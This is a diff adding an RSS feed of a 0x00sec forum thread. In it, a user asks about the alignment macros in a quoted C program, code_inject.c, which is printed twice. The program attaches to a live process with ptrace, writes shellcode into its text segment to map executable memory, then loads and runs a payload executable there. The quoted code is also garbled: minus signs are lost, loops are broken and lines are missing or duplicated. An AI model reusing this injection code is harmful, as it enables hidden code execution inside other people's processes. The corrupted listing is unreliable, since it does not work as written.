@@ -1,0 +1,643 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>ELF process memory injection</title>
+    <link>https://0x00sec.org/t/elf-process-memory-injection/5789</link>
+    <description>Hello, 
+
+On lines 15-18, why does the author use big wise operators in that way? What, exactly, is the purpose? 
+
+Here is a description of the program in the author’s own words:
+
+
+“
+
+&gt; In Linux, the default ptrace() behavior is such that it allows you to write Using PTRACE_POKETEXT to segments that are not writable, such as the text segment. This is because it is expected that debuggers will need to insert breakpoints into the code. This works out great for hackers who want to insert code into memory and execute it. To demonstrate this, we have written code_inject.c. This attaches to a process and injects a shellcode that will create an anonymous memory mapping large enough to hold our payload executable, payload.c, which is then injected into the new memory and executed.“
+
+
+
+      1 #include &lt;stdio.h&gt;
+      2 #include &lt;string.h&gt;
+      3 #include &lt;stdlib.h&gt;
+      4 #include &lt;unistd.h&gt;
+      5 #include &lt;fcntl.h&gt;
+      6 #include &lt;errno.h&gt;
+      7 #include &lt;signal.h&gt;
+      8 #include &lt;elf.h&gt;
+      9 #include &lt;sys/types.h&gt;
+     10 #include &lt;sys/user.h&gt;
+     11 #include &lt;sys/stat.h&gt;
+     12 #include &lt;sys/ptrace.h&gt;
+     13 #include &lt;sys/mman.h&gt;
+     14
+     15 #define PAGE_ALIGN(x) (x &amp; ~(PAGE_SIZE 1))
+     16 #define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)
+     17 #define WORD_ALIGN(x) ((x + 7) &amp; ~7)
+     18 #define BASE_ADDRESS 0x00100000
+     19
+     20 typedef struct handle {
+     21     Elf64_Ehdr *ehdr;
+     22     Elf64_Phdr *phdr;
+     23     Elf64_Shdr *shdr;
+     24     uint8_t *mem;
+     25     pid_t pid;
+     26     uint8_t *shellcode;
+     27     char *exec_path;
+     28     uint64_t base;
+     29     uint64_t stack;
+     30     uint64_t entry;
+     31     struct user_regs_struct pt_reg;
+     32 } handle_t;
+     33
+     34 static inline volatile void * evil_mmap(void *, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t)__attribute__((aligned(8), __always_inline__))    ;
+     35 uint64_t injection_code(void *) __attribute__((aligned(8)));
+     36 uint64_t get_text_base(pid_t);
+     37 int pid_write(int, void *, const void *, size_t);
+     38 uint8_t *create_fn_shellcode(void (*fn)(), size_t len);
+     39
+     40 void *f1 = injection_code;
+     41 void *f2 = get_text_base;
+     42
+     43 static inline volatile long evil_write(long fd, char *buf, unsigned long len) {
+     44     long ret;
+     45     __asm__ volatile(
+     46             &quot;mov %0, %%rdi\n&quot;
+     47             &quot;mov %1, %%rsi\n&quot;
+     48             &quot;mov %2, %%rdx\n&quot;
+     49             &quot;mov %1, %%rax\n&quot;
+     50             &quot;syscall&quot; : : &quot;g&quot;(fd), &quot;g&quot;(buf), &quot;g&quot;(len));
+     51     asm(&quot;mov %%rax, %0&quot; : &quot;=r&quot;(ret));
+     52     return ret;
+     53 }
+     54
+     55 static inline volatile int evil_fstat(long fd, struct stat *buf) {
+     56     long ret;
+     57     __asm__ volatile(
+     58             &quot;mov %0, %%rdi\n&quot;
+     59             &quot;mov %1, %%rsi\n&quot;
+     60             &quot;mov %5, %%rax\n&quot;
+     61             &quot;syscall&quot; : : &quot;g&quot;(fd), &quot;g&quot;(buf));
+     62     asm(&quot;mov %%rax, %0&quot; : &quot;=r&quot;(ret));
+     63     return ret;
+     64 }
+     65
+     66 static inline volatile int evil_open(const char *path, unsigned long flags) {
+     67     long ret;
+     68     __asm__ volatile(
+     69             &quot;mov %0, %%rdi\n&quot;
+     70             &quot;mov %1, %%rsi\n&quot;
+     71             &quot;mov %2, %%rax\n&quot;
+     72             &quot;syscall&quot; : : &quot;g&quot;(path), &quot;g&quot;(flags));
+     73     asm(&quot;mov %%rax, %0&quot; : &quot;=r&quot;(ret));
+     74     return ret;
+     75 }
+     76
+     77 static inline volatile void * evil_mmap(void *addr, uint64_t len, uint64_t prot, uint64_t flags, uint64_t fd, uint64_t off) {
+     78     long mmap_fd = fd;
+     79     unsigned long mmap_off = off;
+     80     unsigned long mmap_flags = flags;
+     81     unsigned long ret;
+     82     __asm__ volatile(
+     83             &quot;mov %0, %%rdi\n&quot;
+     84             &quot;mov %1, %%rsi\n&quot;
+     85             &quot;mov %2, %%rdx\n&quot;
+     86             &quot;mov %3, %%r10\n&quot;
+     87             &quot;mov %5, %%r8\n&quot;
+     88             &quot;mov %5, %%r9\n&quot;
+     89             &quot;mov $9, %%rax\n&quot;
+     90             &quot;syscall\n&quot; : : &quot;g&quot;(addr), &quot;g&quot;(len), &quot;g&quot;(prot), &quot;g&quot;(flags), &quot;g&quot;(mmap_fd), &quot;g&quot;(mmap_off));
+     91     asm(&quot;mov %%rax, %0&quot; : &quot;=r&quot;(ret));
+     92     return(void *)ret;
+     93 }
+     94
+     95 uint64_t injection_code(void * vaddr) {
+     96     volatile void *mem;
+     97     mem = evil_mmap(vaddr, 8192, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, 1, 0);
+     98     __asm__ __volatile__(&quot;int3&quot;);
+     99 }
+    100
+    101 #define MAX_PATH 512
+    102
+    103 uint64_t get_text_base(pid_t pid) {
+    104     char maps[MAX_PATH], line[256];
+    105     char *start, *p;
+    106     FILE *fd;
+    107     int i;
+    108     Elf64_Addr base;
+    109     snprintf(maps, MAX_PATH, 1, &quot;/proc/%d/maps&quot;, pid);
+    110     if((fd = fopen(maps, &quot;r&quot;)) == NULL) {
+    111         fprintf(stderr, &quot;Cannot open %s for reading: %s\n&quot;, maps, strerror(errno));
+    112         return 1;
+    113     }
+
+    115     while(fgets(line, sizeof(line), fd)) {
+    116         if(!strstr(line, &quot;rxp&quot;))
+    117             continue;
+    118         for(i = 0, start = alloca(32), p = line; *p != &#39; &#39;; i++, p++)
+    119             start[i] = *p;
+    120
+    121         start[i] = &#39;\0&#39;;
+    122         base = strtol(start, NULL, 16);
+    123         break;
+    124     }
+    125     fclose(fd);
+    126     return base;
+    127 }
+    128
+    129 uint8_t * create_fn_shellcode(void (*fn)(), size_t len) {
+    130     size_t i;
+    131     uint8_t *shellcode = (uint8_t *)malloc(len);
+    132     uint8_t *p = (uint8_t *)fn;
+    133     for(i = 0; i &lt; len; i++)
+    134         return shellcode;
+    135 }
+    136
+    137 int pid_read(int pid, void *dst, const void *src, size_t len) {
+    138     int sz = len / sizeof(void *);
+    139     unsigned char *s = (unsigned char *)src;
+    140     unsigned char *d = (unsigned char *)dst;
+    141     long word;
+    142     while (sz!=0) {
+    143         word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
+    144         if (word == 1 &amp;&amp; errno) {
+    145             fprintf(stderr, &quot;pid_read failed, pid: %d: %s\n&quot;, pid,strerror(errno));
+    146
+    147             goto fail;
+    148         }
+    149
+    150         *(long *)d = word;
+    151         s += sizeof(long);
+    152         d += sizeof(long);
+    153     }
+    154     return 0;
+    155 fail:
+    156     perror(&quot;PTRACE_PEEKTEXT&quot;);
+    157     return 1;
+    158 }
+    159
+    160 int pid_write(int pid, void *dest, const void *src, size_t len) {
+    161     size_t quot = len / sizeof(void *);
+    162     unsigned char *s = (unsigned char *) src;
+    163     unsigned char *d = (unsigned char *) dest;
+    164     while (quot!= 0) {
+    165         if ( ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1)
+    166             goto out_error;
+    167         s += sizeof(void *);
+    168         d += sizeof(void *);
+    169     }
+    170     return 0;
+    171     out_error:
+    172     perror(&quot;PTRACE_POKETEXT&quot;);
+    173     return 1;
+    174 }
+    175
+    176 int main(int argc, char **argv) {
+    177     handle_t h;
+    178     unsigned long shellcode_size = f2, f1;
+    179     int i, fd, status;
+    180     uint8_t *executable, *origcode;
+    181     struct stat st;
+    182     Elf64_Ehdr *ehdr;
+    183
+    184     if(argc &lt; 3) {
+    185         printf(&quot;Usage: %s &lt;pid&gt; &lt;executable&gt;\n&quot;, argv[0]);
+    186         exit(1);
+    187     }
+    188
+    189     h.pid = atoi(argv[1]);
+    190     h.exec_path = strdup(argv[2]);
+    191
+    192     if(ptrace(PTRACE_ATTACH, h.pid) &lt; 0) {
+    193         perror(&quot;PTRACE_ATTACH&quot;);
+    194         exit(1);
+    195     }
+    196
+    197     wait(NULL);
+    198
+    199     h.base = get_text_base(h.pid);
+    200     shellcode_size += 8;
+    201     h.shellcode = create_fn_shellcode((void *)&amp;injection_code, shellcode_size);
+    202     origcode = alloca(shellcode_size);
+    203
+    204     if(pid_read(h.pid, (void *)origcode, (void *)h.base, shellcode_size) &lt; 0)
+    205         exit(1);
+    206
+    207     if(pid_write(h.pid, (void *)h.base, (void *)h.shellcode, shellcode_size) &lt; 0)
+    208         exit(1);
+    209
+    210     if(ptrace(PTRACE_GETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
+    211         perror(&quot;PTRACE_GETREGS&quot;);
+    212         exit(1);
+    213     }
+    214     h.pt_reg.rip = h.base;
+    215     h.pt_reg.rdi = BASE_ADDRESS;
+    216
+    217     if(ptrace(PTRACE_SETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
+    218         perror(&quot;PTRACE_SETREGS&quot;);
+    219         exit(1);
+    220     }
+    221     if(ptrace(PTRACE_CONT, h.pid, NULL, NULL) &lt; 0) {
+    222         perror(&quot;PTRACE_CONT&quot;);
+    223         exit(1);
+    224     }
+    225
+    226     wait(&amp;status);
+    227
+    228     if(WSTOPSIG(status) != SIGTRAP) {
+     if(WSTOPSIG(status) != SIGTRAP) {
+    229         printf(&quot;Something went wrong\n&quot;);
+    230         exit(1);
+    231     }
+    232
+    233     if(pid_write(h.pid, (void *)h.base, (void *)origcode, shellcode_size) &lt; 0)
+    234         exit(1);
+    235
+    236     if((fd = open(h.exec_path, O_RDONLY)) &lt; 0) {
+    237     perror(&quot;open&quot;);
+    238     exit(1);
+    239   }
+    240
+    241     if(fstat(fd, &amp;st) &lt; 0) {
+    242         perror(&quot;fstat&quot;);
+    243         exit(1);
+    244     }
+    245     executable = malloc(WORD_ALIGN(st.st_size));
+    246
+    247     if (read(fd, executable, st.st_size) &lt; 0) {
+    248         perror(&quot;read&quot;);
+    249         exit(1);
+    250     }
+    251
+    252     ehdr = (Elf64_Ehdr *)executable;
+    253     h.entry = ehdr-&gt;e_entry;
+    254
+    255     close(fd);
+    256
+    257     if(pid_write(h.pid, (void *)BASE_ADDRESS, (void *)executable, st.st_size) &lt; 0)
+    258         exit(1);
+    259
+    260     if(ptrace(PTRACE_GETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
+    261         perror(&quot;PTRACE_GETREGS&quot;);
+    262         exit(1);
+    263     }
+    264
+    265     h.entry = BASE_ADDRESS + h.entry;
+    266
+    267     h.pt_reg.rip = h.entry;
+    268
+    269     if(ptrace(PTRACE_SETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
+    270         perror(&quot;PTRACE_SETREGS&quot;);
+    271         exit(1);
+    272     }
+    273
+    274     if(ptrace(PTRACE_DETACH, h.pid, NULL, NULL) &lt; 0) {
+    275         perror(&quot;PTRACE_CONT&quot;);
+    276         exit(1);
+    277     }
+    278
+    279     wait(NULL);
+    280     exit(0);
+    281 }</description>
+    
+    <lastBuildDate>Sat, 10 Mar 2018 20:09:36 +0000</lastBuildDate>
+    <category>Questions</category>
+    <atom:link href="https://0x00sec.org/t/elf-process-memory-injection/5789.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>ELF process memory injection</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://0x00sec.org/t/elf-process-memory-injection/5789/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/elf-process-memory-injection/5789/3</link>
+        <pubDate>Mon, 12 Mar 2018 03:26:32 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-5789-3</guid>
+        <source url="https://0x00sec.org/t/elf-process-memory-injection/5789.rss">ELF process memory injection</source>
+      </item>
+      <item>
+        <title>ELF process memory injection</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi <a class="mention" href="https://0x00sec.org/u/bowlslaw">@Bowlslaw</a></p>
+<p>Check section <strong>Understanding Paging</strong> in</p>
+<aside class="quote quote-modified" data-post="1" data-topic="537">
+  <div class="title">
+    <div class="quote-controls"></div>
+    <img alt="" width="20" height="20" src="/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar">
+    <a href="https://0x00sec.org/t/a-simple-linux-crypter/537">A simple Linux Crypter</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/malware/56"><span class="badge-category-bg" style="background-color: #F7941D;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Malware</span></a>
+  </div>
+  <blockquote>
+    As <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> has explained us how to write a crypter for Windows, and <a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a> has done the same for C#, I’m going to talk about how to build similar stuff for GNU/Linux. This post is kind of based on something else I wrote some months ago for a different community. I had tried to make a twist of the original paper, but… to be honest, it is difficult to come up with something simpler. 
+I will skip the scan-time crypter. There are no big differences compared to what has already been said in this com…
+  </blockquote>
+</aside>
+
+          <p><a href="https://0x00sec.org/t/elf-process-memory-injection/5789/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/elf-process-memory-injection/5789/2</link>
+        <pubDate>Sat, 10 Mar 2018 20:09:36 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-5789-2</guid>
+        <source url="https://0x00sec.org/t/elf-process-memory-injection/5789.rss">ELF process memory injection</source>
+      </item>
+      <item>
+        <title>ELF process memory injection</title>
+        <dc:creator><![CDATA[Bowlslaw]]></dc:creator>
+        <description><![CDATA[
+            <p>Hello,</p>
+<p>On lines 15-18, why does the author use big wise operators in that way? What, exactly, is the purpose?</p>
+<p>Here is a description of the program in the author’s own words:</p>
+<p>“</p>
+<blockquote>
+<p>In Linux, the default ptrace() behavior is such that it allows you to write Using PTRACE_POKETEXT to segments that are not writable, such as the text segment. This is because it is expected that debuggers will need to insert breakpoints into the code. This works out great for hackers who want to insert code into memory and execute it. To demonstrate this, we have written code_inject.c. This attaches to a process and injects a shellcode that will create an anonymous memory mapping large enough to hold our payload executable, payload.c, which is then injected into the new memory and executed.“</p>
+</blockquote>
+<pre><code>  1 #include &lt;stdio.h&gt;
+  2 #include &lt;string.h&gt;
+  3 #include &lt;stdlib.h&gt;
+  4 #include &lt;unistd.h&gt;
+  5 #include &lt;fcntl.h&gt;
+  6 #include &lt;errno.h&gt;
+  7 #include &lt;signal.h&gt;
+  8 #include &lt;elf.h&gt;
+  9 #include &lt;sys/types.h&gt;
+ 10 #include &lt;sys/user.h&gt;
+ 11 #include &lt;sys/stat.h&gt;
+ 12 #include &lt;sys/ptrace.h&gt;
+ 13 #include &lt;sys/mman.h&gt;
+ 14
+ 15 #define PAGE_ALIGN(x) (x &amp; ~(PAGE_SIZE 1))
+ 16 #define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)
+ 17 #define WORD_ALIGN(x) ((x + 7) &amp; ~7)
+ 18 #define BASE_ADDRESS 0x00100000
+ 19
+ 20 typedef struct handle {
+ 21     Elf64_Ehdr *ehdr;
+ 22     Elf64_Phdr *phdr;
+ 23     Elf64_Shdr *shdr;
+ 24     uint8_t *mem;
+ 25     pid_t pid;
+ 26     uint8_t *shellcode;
+ 27     char *exec_path;
+ 28     uint64_t base;
+ 29     uint64_t stack;
+ 30     uint64_t entry;
+ 31     struct user_regs_struct pt_reg;
+ 32 } handle_t;
+ 33
+ 34 static inline volatile void * evil_mmap(void *, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t)__attribute__((aligned(8), __always_inline__))    ;
+ 35 uint64_t injection_code(void *) __attribute__((aligned(8)));
+ 36 uint64_t get_text_base(pid_t);
+ 37 int pid_write(int, void *, const void *, size_t);
+ 38 uint8_t *create_fn_shellcode(void (*fn)(), size_t len);
+ 39
+ 40 void *f1 = injection_code;
+ 41 void *f2 = get_text_base;
+ 42
+ 43 static inline volatile long evil_write(long fd, char *buf, unsigned long len) {
+ 44     long ret;
+ 45     __asm__ volatile(
+ 46             "mov %0, %%rdi\n"
+ 47             "mov %1, %%rsi\n"
+ 48             "mov %2, %%rdx\n"
+ 49             "mov %1, %%rax\n"
+ 50             "syscall" : : "g"(fd), "g"(buf), "g"(len));
+ 51     asm("mov %%rax, %0" : "=r"(ret));
+ 52     return ret;
+ 53 }
+ 54
+ 55 static inline volatile int evil_fstat(long fd, struct stat *buf) {
+ 56     long ret;
+ 57     __asm__ volatile(
+ 58             "mov %0, %%rdi\n"
+ 59             "mov %1, %%rsi\n"
+ 60             "mov %5, %%rax\n"
+ 61             "syscall" : : "g"(fd), "g"(buf));
+ 62     asm("mov %%rax, %0" : "=r"(ret));
+ 63     return ret;
+ 64 }
+ 65
+ 66 static inline volatile int evil_open(const char *path, unsigned long flags) {
+ 67     long ret;
+ 68     __asm__ volatile(
+ 69             "mov %0, %%rdi\n"
+ 70             "mov %1, %%rsi\n"
+ 71             "mov %2, %%rax\n"
+ 72             "syscall" : : "g"(path), "g"(flags));
+ 73     asm("mov %%rax, %0" : "=r"(ret));
+ 74     return ret;
+ 75 }
+ 76
+ 77 static inline volatile void * evil_mmap(void *addr, uint64_t len, uint64_t prot, uint64_t flags, uint64_t fd, uint64_t off) {
+ 78     long mmap_fd = fd;
+ 79     unsigned long mmap_off = off;
+ 80     unsigned long mmap_flags = flags;
+ 81     unsigned long ret;
+ 82     __asm__ volatile(
+ 83             "mov %0, %%rdi\n"
+ 84             "mov %1, %%rsi\n"
+ 85             "mov %2, %%rdx\n"
+ 86             "mov %3, %%r10\n"
+ 87             "mov %5, %%r8\n"
+ 88             "mov %5, %%r9\n"
+ 89             "mov $9, %%rax\n"
+ 90             "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
+ 91     asm("mov %%rax, %0" : "=r"(ret));
+ 92     return(void *)ret;
+ 93 }
+ 94
+ 95 uint64_t injection_code(void * vaddr) {
+ 96     volatile void *mem;
+ 97     mem = evil_mmap(vaddr, 8192, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, 1, 0);
+ 98     __asm__ __volatile__("int3");
+ 99 }
+100
+101 #define MAX_PATH 512
+102
+103 uint64_t get_text_base(pid_t pid) {
+104     char maps[MAX_PATH], line[256];
+105     char *start, *p;
+106     FILE *fd;
+107     int i;
+108     Elf64_Addr base;
+109     snprintf(maps, MAX_PATH, 1, "/proc/%d/maps", pid);
+110     if((fd = fopen(maps, "r")) == NULL) {
+111         fprintf(stderr, "Cannot open %s for reading: %s\n", maps, strerror(errno));
+112         return 1;
+113     }
+
+115     while(fgets(line, sizeof(line), fd)) {
+116         if(!strstr(line, "rxp"))
+117             continue;
+118         for(i = 0, start = alloca(32), p = line; *p != ' '; i++, p++)
+119             start[i] = *p;
+120
+121         start[i] = '\0';
+122         base = strtol(start, NULL, 16);
+123         break;
+124     }
+125     fclose(fd);
+126     return base;
+127 }
+128
+129 uint8_t * create_fn_shellcode(void (*fn)(), size_t len) {
+130     size_t i;
+131     uint8_t *shellcode = (uint8_t *)malloc(len);
+132     uint8_t *p = (uint8_t *)fn;
+133     for(i = 0; i &lt; len; i++)
+134         return shellcode;
+135 }
+136
+137 int pid_read(int pid, void *dst, const void *src, size_t len) {
+138     int sz = len / sizeof(void *);
+139     unsigned char *s = (unsigned char *)src;
+140     unsigned char *d = (unsigned char *)dst;
+141     long word;
+142     while (sz!=0) {
+143         word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
+144         if (word == 1 &amp;&amp; errno) {
+145             fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid,strerror(errno));
+146
+147             goto fail;
+148         }
+149
+150         *(long *)d = word;
+151         s += sizeof(long);
+152         d += sizeof(long);
+153     }
+154     return 0;
+155 fail:
+156     perror("PTRACE_PEEKTEXT");
+157     return 1;
+158 }
+159
+160 int pid_write(int pid, void *dest, const void *src, size_t len) {
+161     size_t quot = len / sizeof(void *);
+162     unsigned char *s = (unsigned char *) src;
+163     unsigned char *d = (unsigned char *) dest;
+164     while (quot!= 0) {
+165         if ( ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1)
+166             goto out_error;
+167         s += sizeof(void *);
+168         d += sizeof(void *);
+169     }
+170     return 0;
+171     out_error:
+172     perror("PTRACE_POKETEXT");
+173     return 1;
+174 }
+175
+176 int main(int argc, char **argv) {
+177     handle_t h;
+178     unsigned long shellcode_size = f2, f1;
+179     int i, fd, status;
+180     uint8_t *executable, *origcode;
+181     struct stat st;
+182     Elf64_Ehdr *ehdr;
+183
+184     if(argc &lt; 3) {
+185         printf("Usage: %s &lt;pid&gt; &lt;executable&gt;\n", argv[0]);
+186         exit(1);
+187     }
+188
+189     h.pid = atoi(argv[1]);
+190     h.exec_path = strdup(argv[2]);
+191
+192     if(ptrace(PTRACE_ATTACH, h.pid) &lt; 0) {
+193         perror("PTRACE_ATTACH");
+194         exit(1);
+195     }
+196
+197     wait(NULL);
+198
+199     h.base = get_text_base(h.pid);
+200     shellcode_size += 8;
+201     h.shellcode = create_fn_shellcode((void *)&amp;injection_code, shellcode_size);
+202     origcode = alloca(shellcode_size);
+203
+204     if(pid_read(h.pid, (void *)origcode, (void *)h.base, shellcode_size) &lt; 0)
+205         exit(1);
+206
+207     if(pid_write(h.pid, (void *)h.base, (void *)h.shellcode, shellcode_size) &lt; 0)
+208         exit(1);
+209
+210     if(ptrace(PTRACE_GETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
+211         perror("PTRACE_GETREGS");
+212         exit(1);
+213     }
+214     h.pt_reg.rip = h.base;
+215     h.pt_reg.rdi = BASE_ADDRESS;
+216
+217     if(ptrace(PTRACE_SETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
+218         perror("PTRACE_SETREGS");
+219         exit(1);
+220     }
+221     if(ptrace(PTRACE_CONT, h.pid, NULL, NULL) &lt; 0) {
+222         perror("PTRACE_CONT");
+223         exit(1);
+224     }
+225
+226     wait(&amp;status);
+227
+228     if(WSTOPSIG(status) != SIGTRAP) {
+ if(WSTOPSIG(status) != SIGTRAP) {
+229         printf("Something went wrong\n");
+230         exit(1);
+231     }
+232
+233     if(pid_write(h.pid, (void *)h.base, (void *)origcode, shellcode_size) &lt; 0)
+234         exit(1);
+235
+236     if((fd = open(h.exec_path, O_RDONLY)) &lt; 0) {
+237     perror("open");
+238     exit(1);
+239   }
+240
+241     if(fstat(fd, &amp;st) &lt; 0) {
+242         perror("fstat");
+243         exit(1);
+244     }
+245     executable = malloc(WORD_ALIGN(st.st_size));
+246
+247     if (read(fd, executable, st.st_size) &lt; 0) {
+248         perror("read");
+249         exit(1);
+250     }
+251
+252     ehdr = (Elf64_Ehdr *)executable;
+253     h.entry = ehdr-&gt;e_entry;
+254
+255     close(fd);
+256
+257     if(pid_write(h.pid, (void *)BASE_ADDRESS, (void *)executable, st.st_size) &lt; 0)
+258         exit(1);
+259
+260     if(ptrace(PTRACE_GETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
+261         perror("PTRACE_GETREGS");
+262         exit(1);
+263     }
+264
+265     h.entry = BASE_ADDRESS + h.entry;
+266
+267     h.pt_reg.rip = h.entry;
+268
+269     if(ptrace(PTRACE_SETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
+270         perror("PTRACE_SETREGS");
+271         exit(1);
+272     }
+273
+274     if(ptrace(PTRACE_DETACH, h.pid, NULL, NULL) &lt; 0) {
+275         perror("PTRACE_CONT");
+276         exit(1);
+277     }
+278
+279     wait(NULL);
+280     exit(0);
+281 }</code></pre>
+          <p><a href="https://0x00sec.org/t/elf-process-memory-injection/5789/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/elf-process-memory-injection/5789/1</link>
+        <pubDate>Sat, 10 Mar 2018 15:00:46 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-5789-1</guid>
+        <source url="https://0x00sec.org/t/elf-process-memory-injection/5789.rss">ELF process memory injection</source>
+      </item>
+  </channel>
+</rss>
